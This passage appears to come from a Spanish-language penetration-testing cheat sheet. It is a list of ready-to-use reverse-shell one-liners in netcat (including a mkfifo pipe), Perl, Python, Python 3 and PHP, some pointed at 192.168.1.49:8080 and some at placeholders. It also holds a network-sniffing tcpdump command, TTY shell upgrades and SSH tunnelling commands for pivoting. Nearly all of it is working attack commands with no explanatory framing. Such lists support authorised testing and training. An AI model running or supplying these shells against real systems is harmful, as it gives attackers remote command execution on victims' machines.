* rm /tmp/blackpipe;mkfifo /tmp/blackpipe;cat /tmp/blackpipe\|/bin/sh -i 2&gt;&1\|nc 192.168.1.49 8080 &gt;/tmp/blackpipe
* nc -c /bin/sh \[IPADDR\] \[PORT\]
* nc -e /bin/sh \[IPADDR\] \[PORT\]
* /bin/sh \| nc \[IPADDR\] \[PORT\]

#### Perl

* perl -e ‘use Socket;$i=”192.168.1.49″;$p=8080;socket\(S,PF\_INET,SOCK\_STREAM,getprotobyname\(“tcp”\)\);if\(connect\(S,sockaddr\_in\($p,inet\_aton\($i\)\)\)\){open\(STDIN,”&gt;&S”\);open\(STDOUT,”&gt;&S”\);open\(STDERR,”&gt;&S”\);exec\(“/bin/sh -i”\);};’

#### Python

* python -c ‘import socket,subprocess,os;s=socket.socket\(socket.AF\_INET,socket.SOCK\_STREAM\);s.connect\(\(“192.168.1.49”,8080\)\);os.dup2\(s.fileno\(\),0\); os.dup2\(s.fileno\(\),1\); os.dup2\(s.fileno\(\),2\);p=subprocess.call\(\[“/bin/sh”,”-i”\]\);’

#### Python 3

* python3 -c 'import socket,subprocess,os;s=socket.socket\(socket.AF\_INET,socket.SOCK\_STREAM\);s.connect\(\("\[IPADDR\]",\[PORT\]\)\);os.dup2\(s.fileno\(\),0\); os.dup2\(s.fileno\(\),1\); os.dup2\(s.fileno\(\),2\);p=subprocess.call\(\["/bin/sh","-i"\]\);'
* python3 -c 'import socket,subprocess,os;s=socket.socket\(socket.AF\_INET,socket.SOCK\_STREAM\);s.connect\(\("\[IPADDR\]",\[PORT\]\)\);os.dup2\(s.fileno\(\),0\); os.dup2\(s.fileno\(\),1\);os.dup2\(s.fileno\(\),2\);import pty; pty.spawn\("/bin/sh"\)'

#### Php

* php -r ‘$sock=fsockopen\(“192.168.1.49”,8080\);exec\(“/bin/sh -i &lt;&3 &gt;&3 2&gt;&3”\);’

### Sniffing de red

* tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21

### TTY-Shell

* python -c 'import pty;pty.spawn\("/bin/bash"\)'
* echo os.system\('/bin/bash'\)
* /bin/sh -i

### Port forwarded SSH

* ssh -\[L/R\] \[local port\]:\[remote ip\]:\[remote port\] \[local user\]@\[local ip\]
* ssh -L 8080:127.0.0.1:80 root@192.168.1.1 \# Local Port
* ssh -R 8080:127.0.0.1:80 root@192.168.1.1 \# Remote Port
* ssh -D 127.0.0.1:9050 -N \[username\]@\[ip\]
* Proxychains

